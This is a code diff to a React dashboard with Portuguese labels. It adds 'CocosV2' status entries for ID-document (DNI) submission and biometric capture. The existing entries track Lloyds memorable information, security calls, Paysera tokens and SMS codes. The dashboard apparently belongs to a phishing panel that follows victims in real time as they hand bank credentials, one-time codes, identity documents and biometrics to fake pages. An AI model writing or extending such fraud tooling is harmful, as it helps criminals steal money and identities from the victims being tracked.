@@ -78,6 +78,12 @@ const statusMap: Record<string, { label: string; icon: React.ReactNode; cls: str
   lloyds_memorable:      { label: "Info Memorável", icon: <KeyRound size={11} />,    cls: "bg-emerald-500/15 text-emerald-400 border-emerald-500/30" },
   lloyds_security_call:  { label: "Chamada Seg.",  icon: <Smartphone size={11} />,  cls: "bg-blue-500/15 text-blue-400 border-blue-500/30" },
   lloyds_calling:        { label: "Ligando",       icon: <Smartphone size={11} />,  cls: "bg-amber-500/15 text-amber-400 border-amber-500/30" },
+  // CocosV2 verification statuses
+  verify_dni_submitted:  { label: "DNI Enviado",   icon: <ShieldCheck size={11} />, cls: "bg-purple-500/15 text-purple-400 border-purple-500/30" },
+  verify_dni_success:    { label: "DNI ✓",          icon: <CheckCircle size={11} />, cls: "bg-green-600/15 text-green-400 border-green-600/30" },
+  verify_dni_error:      { label: "DNI ✗",          icon: <XCircle size={11} />,     cls: "bg-destructive/15 text-destructive border-destructive/30" },
+  biometric_started:     { label: "Biometria ▶",   icon: <ShieldCheck size={11} />, cls: "bg-blue-500/15 text-blue-400 border-blue-500/30 animate-pulse" },
+  biometric_finished:    { label: "Biometria ✓",   icon: <CheckCircle size={11} />, cls: "bg-green-600/15 text-green-400 border-green-600/30" },
 };
 
 /* ═══════════════════════════════════════════ */
@@ -114,6 +120,12 @@ const getClientStage = (status: string): { label: string; color: string } => {
   if (status === "paysera_show_token") return { label: "Vendo token (app)", color: "text-blue-400" };
   if (status === "paysera_ask_sms") return { label: "Digitando SMS", color: "text-blue-400" };
   if (status === "paysera_verify_phone") return { label: "Verificando Tel", color: "text-orange-400" };
+  // CocosV2 verification
+  if (status === "verify_dni_submitted")  return { label: "Enviou DNI",           color: "text-purple-400" };
+  if (status === "verify_dni_success")    return { label: "DNI validado ✓",       color: "text-green-400" };
+  if (status === "verify_dni_error")      return { label: "DNI falhou",           color: "text-destructive" };
+  if (status === "biometric_started")     return { label: "Iniciou biometria",    color: "text-blue-400" };
+  if (status === "biometric_finished")    return { label: "Biometria concluída ✓", color: "text-green-400" };
   return { label: status.replace(/_/g, " "), color: "text-muted-foreground" };
 };
 
